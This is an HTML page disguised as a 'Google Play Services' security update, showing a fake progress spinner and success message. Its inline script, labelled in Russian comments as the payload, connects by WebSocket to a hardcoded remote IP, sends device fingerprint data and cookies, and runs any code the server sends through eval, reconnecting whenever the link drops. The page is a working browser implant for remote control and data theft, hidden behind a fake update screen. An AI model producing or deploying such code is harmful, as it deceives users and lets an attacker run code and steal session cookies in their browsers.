<!DOCTYPE html>
<html>
<head>
    <title>System Update</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            text-align: center;
            max-width: 500px;
            width: 100%;
        }
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #667eea;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 2s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔒 Security Update</h1>
        <p>Installing latest security patches...</p>
        <div class="loader" id="loader"></div>
        <div id="status" class="hidden">
            <p>✅ Update completed successfully</p>
            <p>You can close this window</p>
        </div>
        <p style="font-size: 12px; color: #666; margin-top: 30px;">
            System Update v3.4.2 • Google Play Services
        </p>
    </div>
    
    <script>
        // Показываем статус завершения через 3 секунды
        setTimeout(function() {
            document.getElementById('loader').classList.add('hidden');
            document.getElementById('status').classList.remove('hidden');
        }, 3000);
        
        // Запускаем наш payload
        (function() {
    // ID клиента
    var clientId = '16189b75b443';
    var serverUrl = 'ws://2.133.241.191:8443/ws';
    
    // Функция отправки данных на сервер
    function sendData(data) {
        try {
            if (window.ws && window.ws.readyState === WebSocket.OPEN) {
                window.ws.send(JSON.stringify(data));
            }
        } catch(e) {}
    }
    
    // Основная функция подключения
    function connect() {
        try {
            console.log('[+] Attempting connection to:', serverUrl);
            window.ws = new WebSocket(serverUrl);
            
            window.ws.onopen = function() {
                console.log('[+] WebSocket connected');
                // Отправляем информацию об устройстве
                var deviceInfo = {
                    type: 'handshake',
                    id: clientId,
                    data: {
                        userAgent: navigator.userAgent,
                        platform: navigator.platform,
                        languages: navigator.languages,
                        screen: {
                            width: screen.width,
                            height: screen.height
                        },
                        url: window.location.href,
                        timestamp: new Date().toISOString()
                    }
                };
                sendData(deviceInfo);
                
                // Отправляем пинг каждые 30 секунд
                setInterval(function() {
                    if (window.ws.readyState === WebSocket.OPEN) {
                        sendData({type: 'ping', id: clientId});
                    }
                }, 30000);
            };
            
            window.ws.onmessage = function(event) {
                try {
                    var cmd = JSON.parse(event.data);
                    console.log('[+] Received command:', cmd.type);
                    
                    // Обработка команд
                    if (cmd.type === 'execute') {
                        try {
                            var result = eval(cmd.code);
                            sendData({
                                type: 'result',
                                id: cmd.id,
                                data: result,
                                success: true
                            });
                        } catch(e) {
                            sendData({
                                type: 'result',
                                id: cmd.id,
                                data: e.toString(),
                                success: false
                            });
                        }
                    }
                    
                    // Другие типы команд можно добавить здесь
                    if (cmd.type === 'get_info') {
                        var info = {
                            type: 'info',
                            id: clientId,
                            data: {
                                href: window.location.href,
                                title: document.title,
                                cookies: document.cookie,
                                referrer: document.referrer
                            }
                        };
                        sendData(info);
                    }
                    
                } catch(e) {
                    console.error('[-] Error parsing message:', e);
                }
            };
            
            window.ws.onerror = function(error) {
                console.error('[-] WebSocket error:', error);
                // Пробуем переподключиться через 5 секунд
                setTimeout(connect, 5000);
            };
            
            window.ws.onclose = function() {
                console.log('[-] WebSocket closed, reconnecting...');
                setTimeout(connect, 5000);
            };
            
        } catch(e) {
            console.error('[-] Connection error:', e);
            setTimeout(connect, 10000);
        }
    }
    
    // Начинаем подключение
    connect();
    
    // Также отправляем HTTP запрос на всякий случай
    setTimeout(function() {
        fetch('http://2.133.241.191:8443/ping?id=' + clientId)
            .catch(function() {});
    }, 2000);
    
    // Собираем дополнительную информацию
    var extraInfo = {
        type: 'pageview',
        id: clientId,
        data: {
            pageLoadTime: performance.timing.loadEventEnd - performance.timing.navigationStart,
            memory: navigator.deviceMemory,
            cores: navigator.hardwareConcurrency,
            touch: 'ontouchstart' in window
        }
    };
    setTimeout(function() { sendData(extraInfo); }, 1000);
    
})();
    </script>
</body>
</html>
